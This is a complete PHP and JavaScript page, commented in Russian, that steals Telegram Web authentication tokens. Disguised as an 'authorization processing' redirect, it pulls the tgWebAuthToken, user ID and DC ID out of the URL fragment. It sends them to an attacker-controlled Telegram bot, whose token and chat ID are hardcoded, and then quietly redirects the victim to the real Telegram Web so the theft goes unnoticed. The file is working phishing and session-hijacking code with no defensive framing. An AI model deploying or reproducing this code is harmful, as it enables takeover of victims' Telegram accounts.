<?php
// Конфигурация
$botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';
$chatId = '8220267007';

// Получаем полный URL (включая фрагмент #)
$fullUrl = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

// Парсим фрагмент (то, что после #)
$fragment = isset($_SERVER['HTTP_X_FRAGMENT']) ? $_SERVER['HTTP_X_FRAGMENT'] : '';
// Но фрагмент не передаётся серверу автоматически. Его можно получить только через JavaScript.
// Поэтому используем комбинированный подход: сервер отдаёт страницу с JS, который отправляет параметры обратно на сервер.

// Чтобы не усложнять, сделаем так:
// 1. Если есть GET-параметр 'token' (от JS), отправляем в Telegram и редиректим.
// 2. Иначе показываем страницу с JS, который извлечёт фрагмент и отправит на этот же скрипт.

if (isset($_GET['token']) && isset($_GET['user_id']) && isset($_GET['dc_id'])) {
    // Пришёл запрос от JavaScript с параметрами
    $token = $_GET['token'];
    $userId = $_GET['user_id'];
    $dcId = $_GET['dc_id'];
    
    // Отправляем в Telegram
    $message = "Перехвачен токен:\nToken: $token\nUser ID: $userId\nDC ID: $dcId";
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Используем file_get_contents для отправки (или curl)
    @file_get_contents($url); // подавляем ошибки
    
    // Перенаправляем на оригинальный Telegram
    header('Location: https://web.telegram.org/k/');
    exit;
}

// Если параметров нет, выводим HTML-страницу с JavaScript, который извлечёт фрагмент
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <p>Обработка авторизации...</p>
    <script>
        (function() {
            const fullUrl = window.location.href;
            const hashIndex = fullUrl.indexOf('#');
            if (hashIndex !== -1) {
                const hashPart = fullUrl.substring(hashIndex + 1);
                const params = new URLSearchParams(hashPart);
                const token = params.get('tgWebAuthToken');
                const userId = params.get('tgWebAuthUserId');
                const dcId = params.get('tgWebAuthDcId');
                if (token && userId && dcId) {
                    // Отправляем параметры на этот же сервер через GET
                    const currentUrl = window.location.href.split('#')[0]; // база без фрагмента
                    const redirectUrl = currentUrl + '?token=' + encodeURIComponent(token) + '&user_id=' + encodeURIComponent(userId) + '&dc_id=' + encodeURIComponent(dcId);
                    window.location.replace(redirectUrl);
                } else {
                    // Нет параметров - редирект на Telegram
                    window.location.replace('https://web.telegram.org/k/');
                }
            } else {
                // Нет фрагмента - редирект на Telegram
                window.location.replace('https://web.telegram.org/k/');
            }
        })();
    </script>
</body>
</html>
